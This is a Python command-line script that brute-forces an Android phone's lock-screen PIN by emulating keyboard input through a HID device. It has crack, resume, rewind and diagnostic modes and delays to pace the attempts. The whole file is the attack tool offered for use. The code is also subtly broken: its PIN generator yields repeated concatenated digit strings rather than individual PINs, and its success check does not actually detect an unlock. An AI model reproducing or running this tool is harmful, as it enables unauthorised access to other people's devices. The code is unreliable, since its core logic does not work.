import os
import time
import sys
import argparse

# Global variables
PIN_LENGTH = 4
DIRECTION = 1

# Load configuration
def load_config(config_file):
    global PIN_LENGTH
    global DIRECTION

    if not os.path.isfile(config_file):
        print("Configuration file not found:", config_file)
        exit(1)

    with open(config_file, "r") as f:
        for line in f:
            key, value = line.split("=")
            if key == "pin_length":
                PIN_LENGTH = int(value)
            elif key == "direction":
                DIRECTION = int(value)

# Generate PIN list
def generate_pinlist():
    return ["".join(str(i) for i in range(10**PIN_LENGTH)) for i in range(10**PIN_LENGTH)]

# Send keystrokes to Android device
def send_keystrokes(pin):
    for digit in pin:
        os.system("hid-keyboard /dev/hiddev0 keyboard %s" % digit)
        time.sleep(0.1)

# Crack PINs
def crack_pins(resume_from=0, direction=DIRECTION):
    pinlist = generate_pinlist()
    if direction == -1:
        pinlist = pinlist[::-1]

    for index, pin in enumerate(pinlist):
        if index < resume_from:
            continue

        send_keystrokes(pin)
        time.sleep(0.5)

        if check_pin(pin):
            print("PIN found:", pin)
            break

        if index % 5 == 0:
            time.sleep(1)

# Check PIN
def check_pin(pin):
    os.system("hid-keyboard /dev/hiddev0 keyboard enter")
    time.sleep(0.5)

    return os.system("adb shell input keyevent 82") == 0

def diagnostic_info():
    print("Configuration:")
    print(" PIN Length:", PIN_LENGTH)
    print(" Direction:", DIRECTION)

# Parse command-line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description="Crack Android PINs using a HID device")
    subparsers = parser.add_subparsers(dest="command")

    crack_parser = subparsers.add_parser("crack", help="Begin cracking PINs")
    crack_parser.add_argument("-c", "--config", help="Specify configuration file")

    resume_parser = subparsers.add_parser("resume", help="Resume from a chosen PIN")
    resume_parser.add_argument("pin", type=int, help="PIN to resume from")
    resume_parser.add_argument("-c", "--config", help="Specify configuration file")

    rewind_parser = subparsers.add_parser("rewind", help="Rewind and start over")
    rewind_parser.add_argument("-c", "--config", help="Specify configuration file")

    subparsers.add_parser("diag", help="Display diagnostic information")
    subparsers.add_parser("version", help="Display version information")

    return parser.parse_args()

# Main function
def main():
    args = parse_arguments()

    if hasattr(args, 'config') and args.config:
        load_config(args.config)

    if args.command == "crack":
        crack_pins()
    elif args.command == "resume":
        crack_pins(resume_from=args.pin, direction=DIRECTION)
    elif args.command == "rewind":
        crack_pins(direction=-1)
    elif args.command == "diag":
        diagnostic_info()
    elif args.command == "version":
        print("Version: 0.2")
    else:
        print("Unknown command:", args.command)


# Start main thread
if __name__ == "__main__":
    main()
